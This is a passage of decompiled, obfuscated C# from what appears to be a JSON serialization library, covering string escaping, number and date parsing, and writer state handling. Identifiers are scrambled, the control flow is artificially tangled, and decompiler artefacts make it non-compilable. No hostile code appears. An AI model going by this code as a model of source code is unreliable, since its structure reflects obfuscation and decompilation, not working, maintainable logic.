          IConvertible convertible = obj2 is IConvertible ? (IConvertible) obj2 : throw \u0014.\u0006.\u0001(obj0, obj2);
          \u0001.\u0004 obj3 = \u0014.\u0006.\u0001(convertible);
          \u000F.\u0003 obj4 = obj3.\u0001() == \u000F.\u0003.\u0002 ? \u000F.\u0003.\u008D : obj3.\u0001();
          // ISSUE: type reference
          object type = convertible.ToType(obj3.\u0001() == \u000F.\u0003.\u0002 ? \u0004\u0002.\u0084\u0004(__typeref (string)) : obj3.\u0001(), (IFormatProvider) \u0098.\u0002\u0004());
          \u0014.\u0006.\u0001(obj0, obj4, type);
          break;
      }
    }

    static bool \u0001([In] \u000E.\u000E obj0, [In] \u0004.\u0011 obj1)
    {
      JsonToken? nullable1 = \u0014.\u0006.\u0001(obj0, obj1);
      if (true)
        goto label_4;
label_1:
      JsonToken? nullable2;
      if (!nullable2.HasValue)
        return \u0014.\u0006.\u0001(obj0, (\u0015.\u0013) obj1);
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, nullable2.GetValueOrDefault());
      do
      {
        obj0.\u0003 = (\u0015.\u0013) obj1;
        obj0.\u0002 = (\u0015.\u0013) obj1;
      }
      while (false);
      return true;
label_4:
      nullable2 = nullable1;
      goto label_1;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static string \u0001([In] \u0004.\u0002 obj0, [In] \u0005.\u0005[] obj1, [In] \u0015.\u0013 obj2)
    {
      StringWriter stringWriter = new StringWriter((IFormatProvider) \u0098.\u0002\u0004());
      try
      {
        \u0005.\u0004 obj;
        if (true)
        {
          if (true)
          {
            obj = new \u0005.\u0004((TextWriter) stringWriter);
            goto label_6;
          }
        }
        else
          goto label_6;
label_4:
        return global::\u0001.\u007E\u0001((object) stringWriter);
label_6:
        do
        {
          \u0014.\u0006.\u0001((JsonWriter) obj, obj0);
        }
        while (false);
        obj2.\u0001((JsonWriter) obj, obj1);
        goto label_4;
      }
      finally
      {
        do
        {
          if (stringWriter != null)
            global::\u0011.\u007E\u0007\u0002((object) stringWriter);
        }
        while (false);
      }
    }

    static \u0016.\u0007 \u0001([In] JsonSerializerInternalReader obj0, [In] System.Type obj1) => (object) obj1 == null ? (\u0016.\u0007) null : obj0.\u0001.\u0001.\u0001(obj1);

    static void \u0001([In] \u001B obj0) => obj0.\u0002 = obj0.\u0002.\u0001();

    static bool \u0001([In] JsonProperty obj0, [In] object obj1, [In] JsonWriter obj2, [In] \u0010.\u0006 obj3)
    {
      if (obj0.\u0003() == null)
        return true;
      if (true)
        goto label_5;
label_4:
      bool flag;
      return flag;
label_5:
      flag = obj0.\u0003()(obj1);
      if (((\u0016.\u0008) obj3).\u0001 != null && ((\u0016.\u0008) obj3).\u0001.\u0001() >= TraceLevel.Verbose)
      {
        ((\u0016.\u0008) obj3).\u0001.\u0001(TraceLevel.Verbose, \u0011.\u0002.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj2), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(18181), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001, (object) obj0.\u0001(), (object) flag)), (Exception) null);
        goto label_4;
      }
      else
        goto label_4;
    }

    static void \u0001([In] \u0012.\u0007 obj0)
    {
label_0:
      JsonContainerType jsonContainerType = obj0.\u0001.\u0001;
      do
      {
        switch (jsonContainerType)
        {
          case JsonContainerType.None:
            continue;
          case JsonContainerType.Object:
            goto label_8;
          case JsonContainerType.Array:
            goto label_9;
          case JsonContainerType.Constructor:
            goto label_3;
          default:
            goto label_12;
        }
      }
      while (false);
      goto label_11;
label_1:
      if (true)
        return;
label_3:
      if (true)
      {
        obj0.\u0001 = \u0012.\u0007.\u0001.\u0010;
        if (true)
          return;
        goto label_1;
      }
      else
        goto label_1;
label_8:
      obj0.\u0001 = \u0012.\u0007.\u0001.\u0005;
      return;
label_9:
      obj0.\u0001 = \u0012.\u0007.\u0001.\u0007;
      goto label_1;
label_11:
      \u0014.\u0006.\u0001(obj0);
      if (true)
        return;
      goto label_0;
label_12:
      throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(18250), (IFormatProvider) \u0098.\u0002\u0004(), (object) jsonContainerType));
    }

    static unsafe void \u0001(
      [In] bool[] obj0,
      [In] ref char[] obj1,
      [In] bool obj2,
      [In] \u0004.\u0003<char> obj3,
      [In] TextWriter obj4,
      [In] \u0001.\u0003 obj5,
      [In] string obj6,
      [In] char obj7)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(13);
      if (obj2)
        obj4.Write(obj7);
      int num1;
      switch (obj6)
      {
        case null:
label_57:
          if (true)
          {
            int num2 = obj2 ? 1 : 0;
            if (false)
            {
              num1 = num2;
              goto label_52;
            }
            else
            {
              if (num2 == 0)
                return;
              goto label_60;
            }
          }
          else
            break;
        default:
          *(int*) voidPtr = 0;
          *(int*) ((IntPtr) voidPtr + 4) = 0;
          goto label_50;
      }
label_13:
      if (false)
        goto label_60;
label_31:
      string a;
      if (a != null)
      {
        *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) string.Equals(a, \u0014.\u0006.\u0082(18451));
        int num3 = *(int*) ((IntPtr) voidPtr + 4);
        if (true)
        {
          int num4 = *(int*) voidPtr;
          if (num3 > num4)
          {
            int num5 = *(int*) ((IntPtr) voidPtr + 4) - *(int*) voidPtr;
            int num6;
            if (*(sbyte*) ((IntPtr) voidPtr + 12) == (sbyte) 0)
              num6 = 0;
            else if (true)
            {
              num6 = 6;
            }
            else
            {
              num1 = num5;
              goto label_52;
            }
            int num7 = num5 + num6;
            int num8;
            int num9;
            char[] destinationArray;
            int num10;
            while (true)
            {
              num8 = num7;
              num9 = *(sbyte*) ((IntPtr) voidPtr + 12) != (sbyte) 0 ? 6 : 0;
              if (obj1 == null || obj1.Length < num8)
              {
                destinationArray = \u0014.\u0006.\u0001(obj3, num8);
                num10 = (int) *(sbyte*) ((IntPtr) voidPtr + 12);
                if (false)
                  num7 = num10;
                else
                  break;
              }
              else
                goto label_44;
            }
            if (num10 != 0)
              Array.Copy((Array) obj1, (Array) destinationArray, 6);
            \u0014.\u0006.\u0001(obj3, obj1);
            obj1 = destinationArray;
label_44:
            obj6.CopyTo(*(int*) voidPtr, obj1, num9, num8 - num9);
            obj4.Write(obj1, num9, num8 - num9);
          }
          *(int*) voidPtr = *(int*) ((IntPtr) voidPtr + 4) + 1;
          num3 = (int) *(sbyte*) ((IntPtr) voidPtr + 12);
        }
        if (num3 == 0)
          obj4.Write(a);
        else
          obj4.Write(obj1, 0, 6);
      }
label_49:
      *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
label_50:
      if (*(int*) ((IntPtr) voidPtr + 4) >= obj6.Length)
      {
        num1 = *(int*) voidPtr;
      }
      else
      {
        char index = obj6[*(int*) ((IntPtr) voidPtr + 4)];
        int num11 = (int) index;
        int num12 = obj0.Length;
        int num13;
        int num14;
        while (true)
        {
          if (true)
          {
            if (num11 >= num12 || obj0[(int) index])
            {
              int num15 = (int) index;
              num12 = 92;
              num11 = num15;
            }
            else
              goto label_49;
          }
          if ((uint) num11 > (uint) num12)
          {
            if (index != '\u0085')
            {
              num13 = (int) index;
              num14 = 8232;
              if (num14 == 0)
              {
                num12 = num14;
                num11 = num13;
              }
              else
                goto label_9;
            }
            else
              goto label_19;
          }
          else
            break;
        }
        switch (index)
        {
          case '\b':
            a = \u0014.\u0006.\u0082(18404);
            goto label_31;
          case '\t':
            a = \u0014.\u0006.\u0082(18384);
            goto label_31;
          case '\n':
            a = \u0014.\u0006.\u0082(18389);
            goto label_13;
          case '\f':
            a = \u0014.\u0006.\u0082(18399);
            goto label_31;
          case '\r':
            a = \u0014.\u0006.\u0082(18394);
            goto label_31;
          case '\\':
            a = \u0014.\u0006.\u0082(18409);
            goto label_31;
          default:
            goto label_22;
        }
label_9:
        if (num13 != num14)
        {
          if (index == '\u2029')
          {
            a = \u0014.\u0006.\u0082(18432);
            goto label_31;
          }
          else
            goto label_22;
        }
        else
        {
          a = \u0014.\u0006.\u0082(18423);
          goto label_31;
        }
label_19:
        a = \u0014.\u0006.\u0082(18414);
        goto label_31;
label_22:
        if ((int) index < obj0.Length || obj5 == \u0001.\u0003.\u0002)
        {
          if (index == '\'' && obj5 != \u0001.\u0003.\u0003)
          {
            a = \u0014.\u0006.\u0082(18441);
            goto label_31;
          }
          else if (index == '"' && obj5 != \u0001.\u0003.\u0003)
          {
            a = \u0014.\u0006.\u0082(18446);
            goto label_31;
          }
          else
          {
            if (obj1 == null || obj1.Length < 6)
              obj1 = \u0014.\u0006.\u0001(obj1, 6, obj3);
            \u0014.\u0006.\u0001(index, obj1);
            a = \u0014.\u0006.\u0082(18451);
            goto label_31;
          }
        }
        else
        {
          a = (string) null;
          goto label_31;
        }
      }
label_52:
      if (num1 == 0)
      {
        obj4.Write(obj6);
        goto label_57;
      }
      else
      {
        *(int*) ((IntPtr) voidPtr + 8) = obj6.Length - *(int*) voidPtr;
        if (obj1 == null || obj1.Length < *(int*) ((IntPtr) voidPtr + 8))
          obj1 = \u0014.\u0006.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8), obj3);
        obj6.CopyTo(*(int*) voidPtr, obj1, 0, *(int*) ((IntPtr) voidPtr + 8));
        obj4.Write(obj1, 0, *(int*) ((IntPtr) voidPtr + 8));
        goto label_57;
      }
label_60:
      obj4.Write(obj7);
    }

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      if (\u0014.\u0006.\u0001(obj0, \u0015.\u0006.\u0004))
        goto label_4;
label_2:
      if (true)
        throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(18456));
label_4:
      \u0011.\u0003 obj = obj0;
      if (true)
        goto label_5;
label_1:
      if (true)
        return;
      goto label_2;
label_5:
      \u0014.\u0006.\u0001((\u0012.\u0007) obj, JsonToken.Undefined);
      goto label_1;
    }

    static \u0004.\u0004 \u0001([In] \u0013.\u0001 obj0) => obj0.\u0001;

    static \u0012.\u0007.\u0001 \u0001([In] \u0012.\u0007 obj0) => obj0.\u0001;

    static MemberInfo \u0001([In] System.Type obj0_1, [In] MemberInfo obj1)
    {
      while (\u0015.\u000E.\u0001(obj1) == MemberTypes.Property)
      {
        PropertyInfo propertyInfo = (PropertyInfo) obj1;
        if (true)
        {
          System.Type[] array = ((IEnumerable<ParameterInfo>) \u0008\u0002.\u007E\u008E\u0004((object) propertyInfo)).Select<ParameterInfo, System.Type>((Func<ParameterInfo, System.Type>) (obj0_2 => \u0001\u0002.\u007E\u0019\u0004((object) obj0_2))).ToArray<System.Type>();
          return (MemberInfo) \u001E\u0004.\u007E\u0016\u0008((object) obj0_1, global::\u0001.\u007E\u000E((object) propertyInfo), BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic, (Binder) null, \u0001\u0002.\u007E\u001D\u0004((object) propertyInfo), array, (ParameterModifier[]) null);
        }
      }
      return ((IEnumerable<MemberInfo>) \u001F\u0004.\u007E\u0017\u0008((object) obj0_1, global::\u0001.\u007E\u000E((object) obj1), \u0015.\u000E.\u0001(obj1), BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)).SingleOrDefault<MemberInfo>();
    }

    static void \u0001([In] JsonWriter obj0, [In] JsonContainerType obj1)
    {
      switch (obj1)
      {
        case JsonContainerType.Object:
          obj0.\u0011();
          break;
        case JsonContainerType.Array:
          obj0.\u000F();
          break;
        case JsonContainerType.Constructor:
          obj0.\u0010();
          break;
        default:
          throw \u0014.\u0006.\u0001(obj0, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(18497), (object) obj1), (Exception) null);
      }
    }

    static \u0004.\u000F<object> \u0001([In] \u0011.\u0008 obj0) => obj0.\u0001;

    static \u0006.\u0005 \u0001() => new \u0006.\u0005((object) null, JTokenType.Null);

    static void \u0001([In] \u0003.\u0006 obj0, [In] \u0004.\u000F<object> obj1) => obj0.\u0002 = obj1;

    static void \u0001([In] JsonWriter obj0)
    {
      while (\u0014.\u0006.\u0001(obj0) > 0)
        obj0.\u0012();
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static bool \u0001(
      string _param0,
      string _param1,
      CultureInfo _param2,
      out DateTimeOffset _param3)
    {
      if (\u001F.\u007E\u0011\u0003((object) _param0) > 0)
      {
        int num1 = (int) \u001B\u0002.\u007E\u0088\u0005((object) _param0, 0);
        int num2 = 47;
        if (num2 != 0)
        {
          if (num1 == num2)
          {
            int num3 = \u001F.\u007E\u0011\u0003((object) _param0);
            if (true)
            {
              if (num3 >= 9)
              {
                if (true)
                  num3 = \u0097.\u007E\u0001\u0004((object) _param0, \u0014.\u0006.\u0082(17828), StringComparison.Ordinal) ? 1 : 0;
                else
                  goto label_11;
              }
              else
                goto label_19;
            }
            if (num3 != 0 && \u0097.\u007E\u009F\u0003((object) _param0, \u0014.\u0006.\u0082(17837), StringComparison.Ordinal) && \u0014.\u0006.\u0001(ref _param3, new \u0015.\u0008(\u009C.\u007E\u0011\u0004((object) _param0), 0, \u001F.\u007E\u0011\u0003((object) _param0))))
              return true;
            goto label_19;
          }
          else if (\u001F.\u007E\u0011\u0003((object) _param0) < 19)
            goto label_19;
label_10:
          if (\u001F.\u007E\u0011\u0003((object) _param0) > 40 || !\u009A.\u000E\u0004(\u001B\u0002.\u007E\u0088\u0005((object) _param0, 0)))
            goto label_19;
label_11:
          if (true)
          {
            int num4 = (int) \u001B\u0002.\u007E\u0088\u0005((object) _param0, 10);
            num2 = 84;
            num1 = num4;
          }
          else
            goto label_10;
        }
        if (num1 == num2)
        {
          int num5 = \u007F\u0004.\u0018\u0008(_param0, \u0014.\u0006.\u0082(17842), (IFormatProvider) \u0098.\u0002\u0004(), DateTimeStyles.RoundtripKind, ref _param3) ? 1 : 0;
          if (true)
          {
            if (num5 != 0)
              num5 = \u0014.\u0006.\u0001(ref _param3, new \u0015.\u0008(\u009C.\u007E\u0011\u0004((object) _param0), 0, \u001F.\u007E\u0011\u0003((object) _param0))) ? 1 : 0;
            else
              goto label_19;
          }
          if (num5 != 0)
            return true;
        }
      }
      else
        goto label_21;
label_19:
      if (global::\u0007.\u009E(_param1) || !\u0014.\u0006.\u0001(_param2, ref _param3, _param0, _param1))
        goto label_21;
label_20:
      return true;
label_21:
      if (true)
      {
        _param3 = new DateTimeOffset();
        if (true)
          return false;
        goto label_19;
      }
      else
        goto label_20;
    }

    static void \u0001([In] JsonProperty obj0, [In] string obj1)
    {
label_0:
      if (true)
        goto label_5;
label_2:
      if (true)
      {
        if (true)
        {
          if (true)
            return;
          goto label_6;
        }
        else
          goto label_0;
      }
      else
        goto label_6;
label_5:
      obj0.\u0001 = obj1;
label_6:
      JsonProperty jsonProperty = obj0;
      string str = obj0.\u0001;
      int num = !\u0014.\u0006.\u0001(\u0016.\u0005.\u0003, str) ? 1 : 0;
      jsonProperty.\u0003 = num != 0;
      goto label_2;
    }

    static ResourceManager \u0001()
    {
      // ISSUE: reference to a compiler-generated field
      while (\u0005.\u0001.\u0001 == null)
      {
        if (true)
        {
          // ISSUE: reference to a compiler-generated field
          // ISSUE: type reference
          \u0005.\u0001.\u0001 = new ResourceManager(\u0014.\u0006.\u0082(18546), \u0080\u0004.\u007E\u0019\u0008((object) \u0004\u0002.\u0084\u0004(__typeref (\u0005.\u0001))));
          break;
        }
      }
      // ISSUE: reference to a compiler-generated field
      return \u0005.\u0001.\u0001;
    }

    static unsafe \u0011.\u0007 \u0001(
      char[] _param0,
      int _param1,
      int _param2,
      out long _param3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(29);
      _param3 = 0L;
      if (_param2 == 0)
        return \u0011.\u0007.\u0004;
      *(sbyte*) ((IntPtr) voidPtr + 28) = (sbyte) (_param0[_param1] == '-');
      if (*(sbyte*) ((IntPtr) voidPtr + 28) == (sbyte) 0)
        goto label_4;
      else
        goto label_32;
label_3:
      --_param2;
label_4:
      *(int*) ((IntPtr) voidPtr + 8) = _param1 + _param2;
      if (_param2 > 19)
      {
        *(int*) ((IntPtr) voidPtr + 12) = _param1;
        while (*(int*) ((IntPtr) voidPtr + 12) < *(int*) ((IntPtr) voidPtr + 8))
        {
          *(int*) ((IntPtr) voidPtr + 16) = (int) _param0[*(int*) ((IntPtr) voidPtr + 12)] - 48;
          if (*(int*) ((IntPtr) voidPtr + 16) < 0 || *(int*) ((IntPtr) voidPtr + 16) > 9)
            return \u0011.\u0007.\u0004;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
        }
      }
      else
        goto label_11;
label_10:
      return \u0011.\u0007.\u0003;
label_11:
      *(int*) ((IntPtr) voidPtr + 20) = _param1;
      while (*(int*) ((IntPtr) voidPtr + 20) < *(int*) ((IntPtr) voidPtr + 8))
      {
        *(int*) ((IntPtr) voidPtr + 24) = (int) _param0[*(int*) ((IntPtr) voidPtr + 20)] - 48;
        if (*(int*) ((IntPtr) voidPtr + 24) < 0 || *(int*) ((IntPtr) voidPtr + 24) > 9)
        {
          if (true)
            return \u0011.\u0007.\u0004;
          break;
        }
        *(long*) voidPtr = 10L * _param3 - (long) *(int*) ((IntPtr) voidPtr + 24);
        if (*(long*) voidPtr > _param3)
        {
          *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
          while (*(int*) ((IntPtr) voidPtr + 20) < *(int*) ((IntPtr) voidPtr + 8))
          {
            *(int*) ((IntPtr) voidPtr + 24) = (int) _param0[*(int*) ((IntPtr) voidPtr + 20)] - 48;
            if (*(int*) ((IntPtr) voidPtr + 24) < 0 || *(int*) ((IntPtr) voidPtr + 24) > 9)
              return \u0011.\u0007.\u0004;
            *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
          }
          if (true)
            return \u0011.\u0007.\u0003;
          goto label_3;
        }
        else
        {
          _param3 = *(long*) voidPtr;
          if (true)
            *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
          else
            goto label_10;
        }
      }
      if (*(sbyte*) ((IntPtr) voidPtr + 28) == (sbyte) 0)
      {
        if (_param3 == long.MinValue)
          return \u0011.\u0007.\u0003;
        _param3 = -_param3;
      }
      return \u0011.\u0007.\u0002;
label_32:
      if (_param2 == 1)
        return \u0011.\u0007.\u0004;
      _param1++;
      goto label_3;
    }

    static unsafe char \u0001([In] \u0011.\u0003 obj0)
    {
      int num1 = 8;
      int num2;
      while (true)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(num1);
        char ch;
        do
        {
          char[] chArray;
          if (!\u0014.\u0006.\u0001(obj0, 4, true))
          {
            if (true)
              goto label_8;
          }
          else
          {
            do
            {
              chArray = obj0.\u0001;
            }
            while (false);
            *(int*) voidPtr = obj0.\u0002;
          }
          *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002 + 4;
          if (true)
          {
            if (true)
              ch = \u0081\u0004.\u001A\u0008(\u0014.\u0006.\u0001(*(int*) ((IntPtr) voidPtr + 4), *(int*) voidPtr, chArray));
          }
          else
            goto label_9;
        }
        while (false);
        obj0.\u0002 += 4;
label_9:
        num2 = (int) ch;
        if (false)
          num1 = num2;
        else
          goto label_2;
      }
label_8:
      throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(18551));
label_2:
      return (char) num2;
    }

    static ConstructorInfo \u0001([In] System.Type obj0, [In] System.Type obj1)
    {
      // ISSUE: type reference
      System.Type type = \u0092\u0002.\u007E\u0011\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (IEnumerable<>)), new System.Type[1]
      {
        obj1
      });
      ConstructorInfo constructorInfo1 = (ConstructorInfo) null;
      ConstructorInfo[] constructorInfoArray = \u0019\u0004.\u007E\u0011\u0008((object) obj0, BindingFlags.Instance | BindingFlags.Public);
      int num = 0;
      if (num == 0)
        goto label_12;
label_3:
      ConstructorInfo constructorInfo2;
      IList<ParameterInfo> parameterInfoList;
      if (num == 1)
      {
        if ((object) type != (object) \u0001\u0002.\u007E\u0019\u0004((object) parameterInfoList[0]))
        {
          if ((object) constructorInfo1 == null && \u0093\u0002.\u007E\u0012\u0006((object) type, \u0001\u0002.\u007E\u0019\u0004((object) parameterInfoList[0])))
          {
            constructorInfo1 = constructorInfo2;
            goto label_8;
          }
          else
            goto label_8;
        }
      }
      else
        goto label_8;
label_5:
      constructorInfo1 = constructorInfo2;
      if (true)
        goto label_11;
label_8:
      int index;
      if (true)
        ++index;
      else
        goto label_5;
label_10:
      if (index < constructorInfoArray.Length)
      {
        do
        {
          constructorInfo2 = constructorInfoArray[index];
        }
        while (false);
        parameterInfoList = (IList<ParameterInfo>) \u0008\u0002.\u007E\u008D\u0004((object) constructorInfo2);
        num = parameterInfoList.Count;
        goto label_3;
      }
label_11:
      return constructorInfo1;
label_12:
      index = num;
      goto label_10;
    }

    static CultureInfo \u0001([In] JsonWriter obj0) => obj0.\u0001 ?? \u0098.\u0002\u0004();

    static void \u0001([In] JsonWriter obj0, [In] JsonToken obj1)
    {
      \u0014.\u0006.\u0001(obj0);
      obj0.\u0002(obj1);
    }

    static IList<object> \u0001([In] System.Type obj0_1)
    {
      if (!\u0015.\u000E.\u0005(obj0_1))
        throw new ArgumentException(\u0014.\u0006.\u0082(18616) + obj0_1.Name + \u0014.\u0006.\u0082(18625));
      List<object> objectList = new List<object>();
      using (IEnumerator<FieldInfo> enumerator = ((IEnumerable<FieldInfo>) obj0_1.GetFields()).Where<FieldInfo>((Func<FieldInfo, bool>) (obj0_2 => \u0015\u0002.\u007E\u001B\u0005((object) obj0_2))).GetEnumerator())
      {
        while (true)
        {
          if (!enumerator.MoveNext())
            goto label_5;
label_3:
          object obj = enumerator.Current.GetValue((object) obj0_1);
          objectList.Add(obj);
          continue;
label_5:
          if (false)
            goto label_3;
          else
            break;
        }
      }
      return (IList<object>) objectList;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      if (true)
      {
        if (true)
          ++obj0.\u0002;
        if (((\u0012.\u0007) obj0).\u0001 == \u0012.\u0007.\u0001.\u000E)
          goto label_8;
        else
          goto label_6;
      }
label_3:
      if (true)
        return;
label_6:
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Undefined);
      if (true)
        throw \u0014.\u0006.\u0001(obj0, ',');
label_8:
      \u0011.\u0003 obj = obj0;
      if (true)
      {
        \u0014.\u0006.\u0001((\u0012.\u0007) obj);
        goto label_3;
      }
      else
        goto label_3;
    }

    static unsafe void \u0001([In] \u0011.\u0003 obj0, [In] char obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(13);
      int index = obj0.\u0002;
      *(int*) voidPtr = obj0.\u0002;
      *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002;
      obj0.\u0001.\u0001(0);
      int num1;
      int num2;
      do
      {
        char ch1 = obj0.\u0001[index++];
        char ch2;
        char ch3;
        int num3;
        int num4;
        if (ch1 <= '\r')
        {
          if (ch1 != char.MinValue)
          {
            int num5 = (int) ch1;
            int num6 = 10;
            if (num6 != 0)
            {
              if (num5 != num6)
              {
                if (ch1 == '\r')
                {
                  obj0.\u0002 = index - 1;
                  goto label_46;
                }
                else
                  continue;
              }
              else
              {
                obj0.\u0002 = index - 1;
                \u0014.\u0006.\u0001(obj0);
                index = obj0.\u0002;
                continue;
              }
            }
            else
            {
              num4 = num6;
              num3 = num5;
            }
          }
          else
          {
            if (obj0.\u0001 == index - 1)
            {
              --index;
              if (\u0014.\u0006.\u0001(true, obj0) == 0)
              {
                obj0.\u0002 = index;
                throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(18650), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1));
              }
              continue;
            }
            continue;
          }
        }
        else
        {
          if (ch1 != '"')
          {
            num1 = (int) ch1;
            num2 = 39;
            if (num2 != 0)
            {
              if (num1 != num2)
              {
                if (ch1 == '\\')
                {
                  obj0.\u0002 = index;
                  if (!\u0014.\u0006.\u0001(obj0, 0, true))
                    throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(18650), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1));
                  *(int*) ((IntPtr) voidPtr + 8) = index - 1;
                  int num7 = (int) obj0.\u0001[index];
                  if (true)
                  {
                    ch2 = (char) num7;
                    ++index;
                    switch (ch2)
                    {
                      case '"':
                      case '\'':
                      case '/':
                        ch3 = ch2;
                        goto label_43;
                      case '\\':
                        ch3 = '\\';
                        goto label_43;
                      case ']':
                      case '^':
                      case '_':
                      case '`':
                      case 'a':
                      case 'c':
                      case 'd':
                      case 'e':
                      case 'f':
                        num3 = (int) ch2;
                        num4 = 102;
                        goto label_19;
                      case 'b':
                        ch3 = '\b';
                        goto label_43;
                      case 'n':
                        ch3 = '\n';
                        goto label_43;
                      case 'r':
                        ch3 = '\r';
                        goto label_43;
                      case 't':
                        num7 = 9;
                        break;
                      case 'u':
                        obj0.\u0002 = index;
                        ch3 = \u0014.\u0006.\u0001(obj0);
                        if (\u0014.\u0006.\u0001(ch3))
                        {
                          ch3 = '�';
                          goto label_41;
                        }
                        else if (!\u0014.\u0006.\u0001(ch3))
                          goto label_41;
                        else
                          goto label_32;
                      default:
                        goto label_42;
                    }
                  }
                  ch3 = (char) num7;
                  goto label_43;
                }
              }
            }
            else
              goto label_17;
          }
          continue;
        }
label_19:
        if (num3 == num4)
        {
          if (true)
          {
            ch3 = '\f';
            goto label_43;
          }
          else
            goto label_46;
        }
        else
          goto label_42;
label_32:
        *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
label_33:
        char ch4;
        if (\u0014.\u0006.\u0001(obj0, 2, true) && obj0.\u0001[obj0.\u0002] == '\\' && obj0.\u0001[obj0.\u0002 + 1] == 'u')
        {
          ch4 = ch3;
          obj0.\u0002 += 2;
          ch3 = \u0014.\u0006.\u0001(obj0);
          if (!\u0014.\u0006.\u0001(ch3))
          {
            if (\u0014.\u0006.\u0001(ch3))
            {
              ch4 = '�';
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
            }
            else
              ch4 = '�';
          }
        }
        else
        {
          ch3 = '�';
          goto label_40;
        }
label_38:
        \u0014.\u0006.\u0001(obj0);
        \u0014.\u0006.\u0001(ch4, *(int*) ((IntPtr) voidPtr + 8), obj0, *(int*) ((IntPtr) voidPtr + 4));
        *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002;
label_40:
        if (*(sbyte*) ((IntPtr) voidPtr + 12) != (sbyte) 0)
          goto label_32;
label_41:
        index = obj0.\u0002;
        goto label_43;
label_42:
        obj0.\u0002 = index;
        throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(18711), (IFormatProvider) \u0098.\u0002\u0004(), (object) global::\u0006.\u009B(\u0014.\u0006.\u0082(18752), ch2.ToString())));
label_43:
        \u0014.\u0006.\u0001(obj0);
        \u0014.\u0006.\u0001(ch3, *(int*) ((IntPtr) voidPtr + 8), obj0, *(int*) ((IntPtr) voidPtr + 4));
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 4) = index;
          continue;
        }
        goto label_38;
label_46:
        \u0014.\u0006.\u0001(obj0, true);
        if (true)
          index = obj0.\u0002;
        else
          goto label_33;
      }
      while ((int) obj0.\u0001[index - 1] != (int) obj1);
      --index;
      int num8 = *(int*) voidPtr;
      int num9 = *(int*) ((IntPtr) voidPtr + 4);
      goto label_51;
label_17:
      num9 = num2;
      num8 = num1;
label_51:
      if (true)
      {
        if (num8 == num9)
        {
          obj0.\u0001 = new \u0015.\u0008(obj0.\u0001, *(int*) voidPtr, index - *(int*) voidPtr);
        }
        else
        {
          \u0014.\u0006.\u0001(obj0);
          if (index > *(int*) ((IntPtr) voidPtr + 4))
            obj0.\u0001.\u0001(obj0.\u0001, obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4), index - *(int*) ((IntPtr) voidPtr + 4));
          obj0.\u0001 = new \u0015.\u0008(obj0.\u0001.\u0001(), 0, obj0.\u0001.\u0001());
        }
        int num10 = index;
        num9 = 1;
        num8 = num10;
      }
      int num11 = num8 + num9;
      obj0.\u0002 = num11;
    }

    static void \u0001(
      ref \u0004.\u0001? _param0,
      out string _param1,
      out \u0015.\u0002? _param2,
      out CultureInfo _param3,
      out \u000E.\u0002? _param4,
      [Out] \u0012.\u0007 _param5,
      out int? _param6,
      [In] \u0016.\u0003 obj7)
    {
